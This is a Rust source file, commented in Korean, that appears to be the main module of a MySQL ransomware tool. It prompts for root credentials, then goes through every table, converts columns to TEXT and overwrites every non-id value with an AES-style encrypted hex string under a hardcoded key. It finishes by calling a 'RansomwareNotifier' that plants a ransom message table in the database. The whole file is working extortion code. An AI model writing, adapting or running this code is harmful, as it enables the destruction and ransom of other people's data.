mod encryptor; // 암호화 모듈을 포함
mod readme;

use mysql::*;
use mysql::prelude::*;
use std::io::{self, Write};

fn main() -> Result<(), mysql::Error> {
	// 사용자로부터 MySQL 접속 정보를 입력받음
    print!("Enter MySQL username: ");
    io::stdout().flush()?; // 출력 버퍼를 비워서 메시지를 즉시 출력
    let mut user = String::new();
    io::stdin().read_line(&mut user)?; // 사용자 이름 입력 받기
    let user = user.trim();

    print!("Enter MySQL server URL: ");
    io::stdout().flush()?;
    let mut url = String::new();
    io::stdin().read_line(&mut url)?; // 서버 URL 입력 받기
    let url = url.trim();

    print!("Enter MySQL server port: ");
    io::stdout().flush()?;
    let mut port_str = String::new();
    io::stdin().read_line(&mut port_str)?; // 포트 입력 받기
    let port: u16 = port_str.trim().parse().expect("Port must be a number");

    print!("Enter MySQL root password: ");
    io::stdout().flush()?;
    let mut passwd = String::new();
    io::stdin().read_line(&mut passwd)?; // 비밀번호 입력 받기
    let passwd = passwd.trim();

    print!("Enter MySQL database name: ");
    io::stdout().flush()?;
    let mut database = String::new();
    io::stdin().read_line(&mut database)?; // 데이터베이스 이름 입력 받기
    let database = database.trim();

    // MySQL 옵션 설정
    let opts = OptsBuilder::new()
        .ip_or_hostname(Some(url))
        .tcp_port(port)
        .user(Some(user))
        .pass(Some(passwd))
        .db_name(Some(database));

    // MySQL 서버에 연결
    let pool = Pool::new(opts)?;
    let mut conn = pool.get_conn()?;

    // 암호화 모듈 초기화
    let key = b"an example very very secret key."; // 32 bytes
    let encryptor = encryptor::Encryptor::new(key);

    // 모든 테이블 이름 가져오기
    let tables: Vec<String> = conn.query("SHOW TABLES")?;

    // 각 테이블에 대해 작업 수행
    for table in &tables {
        println!("\n테이블: {}", table);

        // 각 테이블의 컬럼 이름과 데이터 타입 가져오기
        let query = format!("SHOW COLUMNS FROM {}", table);
        let columns: Vec<(String, String)> = conn.query_map(
            query,
            |(field, field_type, _, _, _, _): (String, String, String, String, Option<String>, String)| {
                (field, field_type)
            },
        )?;

        // 컬럼 타입이 문자열 타입이 아닌 경우, 문자열 타입으로 변환
        for (field, field_type) in &columns {
            if field_type.starts_with("char") || field_type.starts_with("text") || field == "id" {
                continue; // 이미 문자열 타입이거나, id 컬럼은 건너뛰기
            }

            let alter_query = format!(
                "ALTER TABLE {} MODIFY {} TEXT",
                table, field
            );

            conn.exec_drop(alter_query, ())?;
        }

        // 각 컬럼에 대해 데이터를 암호화하여 업데이트
        for (field, _field_type) in &columns {
            if field == "id" {
                continue; // id 컬럼은 건너뛰기
            }

            let select_query = format!("SELECT {} FROM {}", field, table);
            let rows: Vec<String> = conn.query_map(select_query, |data: String| data)?;

            for data in rows {
                let encrypted_data = encryptor.encrypt(&data);
                let encrypted_hex = hex::encode(&encrypted_data);

                let update_query = format!(
                    "UPDATE {} SET {} = '{}' WHERE {} = '{}'",
                    table, field, encrypted_hex, field, data
                );

                conn.exec_drop(update_query, ())?;
            }
        }

        println!("테이블 {}의 모든 컬럼 데이터가 암호화되었습니다.", table);
    }

	// RansomwareNotifier 초기화
    let notifier = readme::RansomwareNotifier::new(user, passwd, url, port, database)
        .expect("Failed to connect to database");

    // 데이터베이스 초기화 (테이블 생성 및 메시지 삽입)
    notifier.initialize_database()
        .expect("Failed to initialize database");

    Ok(())
}
